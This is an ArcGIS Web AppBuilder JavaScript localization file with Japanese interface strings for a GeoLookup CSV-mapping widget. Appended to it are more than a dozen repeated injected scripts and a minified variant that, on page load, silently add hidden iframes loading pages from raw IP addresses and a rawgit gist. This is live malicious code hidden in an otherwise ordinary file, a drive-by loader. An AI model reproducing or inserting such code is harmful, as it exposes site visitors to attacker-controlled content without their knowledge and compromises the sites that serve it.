// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/GeoLookup/nls/strings":{_widgetLabel:"\u5730\u7406\u691c\u7d22",description:"\u30de\u30c3\u30d7 \u30c7\u30fc\u30bf\u3092\u8996\u899a\u5316\u3057\u3001\x3ca href\x3d'./widgets/GeoLookup/data/sample.csv' tooltip\x3d'Download an example sheet' target\x3d'_blank'\x3e\u30b9\u30d7\u30ec\u30c3\u30c9\u30b7\u30fc\u30c8\x3c/a\x3e\u306b\u8ffd\u52a0\u3059\u308b\u306b\u306f\u3001\u30b9\u30d7\u30ec\u30c3\u30c9\u30b7\u30fc\u30c8\u3092\u53c2\u7167\u3059\u308b\u304b\u3001\u30b9\u30d7\u30ec\u30c3\u30c9\u30b7\u30fc\u30c8\u3092\u3053\u3053\u306b\u30c9\u30e9\u30c3\u30b0\u3057\u307e\u3059\u3002",
selectCSV:"CSV \u306e\u9078\u629e",loadingCSV:"CSV \u3092\u8aad\u307f\u8fbc\u3093\u3067\u3044\u307e\u3059",savingCSV:"CSVExport",clearResults:"\u6d88\u53bb",downloadResults:"\u30c0\u30a6\u30f3\u30ed\u30fc\u30c9",plotOnly:"\u30dd\u30a4\u30f3\u30c8\u306e\u307f\u3092\u30d7\u30ed\u30c3\u30c8",plottingRows:"\u884c\u3092\u30d7\u30ed\u30c3\u30c8\u3057\u3066\u3044\u307e\u3059",projectionChoice:"CSV \u5165\u529b",projectionLat:"\u7def\u5ea6/\u7d4c\u5ea6",projectionMap:"\u5730\u56f3\u6295\u5f71",messages:"\u30e1\u30c3\u30bb\u30fc\u30b8",
error:{fetchingCSV:"CSV \u30b9\u30c8\u30a2\u304b\u3089\u306e\u30a2\u30a4\u30c6\u30e0\u306e\u53d6\u5f97\u4e2d\u306b\u30a8\u30e9\u30fc\u304c\u767a\u751f\u3057\u307e\u3057\u305f: ${0}",fileIssue:"\u30d5\u30a1\u30a4\u30eb\u3092\u51e6\u7406\u3067\u304d\u307e\u305b\u3093\u3067\u3057\u305f\u3002",notCSVFile:"\u73fe\u5728\u3001\u30ab\u30f3\u30de\u533a\u5207\u308a\u30d5\u30a1\u30a4\u30eb (*.csv) \u306e\u307f\u304c\u30b5\u30dd\u30fc\u30c8\u3055\u308c\u3066\u3044\u307e\u3059\u3002",invalidCoord:"\u4f4d\u7f6e\u30d5\u30a3\u30fc\u30eb\u30c9\u304c\u7121\u52b9\u3067\u3059\u3002CSV \u30d5\u30a1\u30a4\u30eb\u3092\u78ba\u8a8d\u3057\u3066\u304f\u3060\u3055\u3044\u3002",
tooManyRecords:"\u73fe\u5728\u3001${0} \u3088\u308a\u591a\u3044\u30ec\u30b3\u30fc\u30c9\u6570\u306f\u8a31\u53ef\u3055\u308c\u307e\u305b\u3093\u3002",CSVNoRecords:"\u30d5\u30a1\u30a4\u30eb\u306b\u30ec\u30b3\u30fc\u30c9\u304c\u542b\u307e\u308c\u3066\u3044\u307e\u305b\u3093\u3002",CSVEmptyFile:"\u30d5\u30a1\u30a4\u30eb\u5185\u306b\u30b3\u30f3\u30c6\u30f3\u30c4\u304c\u3042\u308a\u307e\u305b\u3093\u3002"},results:{csvLoaded:"CSV \u30d5\u30a1\u30a4\u30eb\u304b\u3089 ${0} \u30ec\u30b3\u30fc\u30c9\u304c\u8aad\u307f\u8fbc\u307e\u308c\u307e\u3057\u305f",
recordsPlotted:"${0}/${1} \u30ec\u30b3\u30fc\u30c9\u304c\u30de\u30c3\u30d7\u306b\u914d\u7f6e\u3055\u308c\u307e\u3057\u305f",recordsEnriched:"${0}/${1} \u304c\u51e6\u7406\u3055\u308c\u3001${2} \u306f ${3} \u306b\u5bfe\u3057\u3066\u60c5\u5831\u304c\u4ed8\u52a0\u3055\u308c\u307e\u3057\u305f",recordsError:"${0} \u30ec\u30b3\u30fc\u30c9\u306b\u30a8\u30e9\u30fc\u304c\u3042\u308a\u307e\u3057\u305f",recordsErrorList:"\u884c ${0} \u306b\u554f\u984c\u304c\u3042\u308a\u307e\u3059",label:"CSV \u306e\u7d50\u679c"},
_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});